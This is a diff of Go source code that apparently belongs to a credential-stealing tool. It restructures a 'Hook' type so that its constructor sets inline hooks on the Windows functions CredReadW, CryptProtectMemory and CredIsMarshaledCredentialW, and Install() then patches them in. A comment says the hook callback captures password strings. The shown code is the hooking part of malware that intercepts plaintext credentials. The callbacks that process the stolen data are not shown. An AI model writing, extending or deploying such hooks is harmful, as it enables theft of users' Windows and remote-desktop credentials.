@@ -52,8 +52,31 @@ type Hook struct {
 
 // NewHook is used to create a hook that include a callback.
 // <security:> usually cover password string in callback function.
-func NewHook(callback Callback) *Hook {
-	return &Hook{callback: callback}
+func NewHook(callback Callback) (*Hook, error) {
+	h := Hook{callback: callback}
+
+	var hookFn interface{}
+	hookFn = h.credReadW
+	pg, err := hook.NewInlineHookByName("advapi32.dll", "CredReadW", true, hookFn)
+	if err != nil {
+		return nil, err
+	}
+	h.pgCredReadW = pg
+
+	hookFn = h.cryptProtectMemory
+	pg, err = hook.NewInlineHookByName("crypt32.dll", "CryptProtectMemory", true, hookFn)
+	if err != nil {
+		return nil, err
+	}
+	h.pgCryptProtectMemory = pg
+
+	hookFn = h.credIsMarshaledCredentialW
+	pg, err = hook.NewInlineHookByName("advapi32.dll", "CredIsMarshaledCredentialW", true, hookFn)
+	if err != nil {
+		return nil, err
+	}
+	h.pgCredIsMarshaledCredentialW = pg
+	return &h, nil
 }
 
 // Install is used to install hook.
@@ -61,27 +84,18 @@ func (h *Hook) Install() error {
 	h.mu.Lock()
 	defer h.mu.Unlock()
 
-	var hookFn interface{}
-	hookFn = h.credReadW
-	pg, err := hook.NewInlineHookByName("advapi32.dll", "CredReadW", true, hookFn)
+	err := h.pgCredReadW.Patch()
 	if err != nil {
 		return err
 	}
-	h.pgCredReadW = pg
-
-	hookFn = h.cryptProtectMemory
-	pg, err = hook.NewInlineHookByName("crypt32.dll", "CryptProtectMemory", true, hookFn)
+	err = h.pgCryptProtectMemory.Patch()
 	if err != nil {
 		return err
 	}
-	h.pgCryptProtectMemory = pg
-
-	hookFn = h.credIsMarshaledCredentialW
-	pg, err = hook.NewInlineHookByName("advapi32.dll", "CredIsMarshaledCredentialW", true, hookFn)
+	err = h.pgCredIsMarshaledCredentialW.Patch()
 	if err != nil {
 		return err
 	}
-	h.pgCredIsMarshaledCredentialW = pg
 	return nil
 }
 
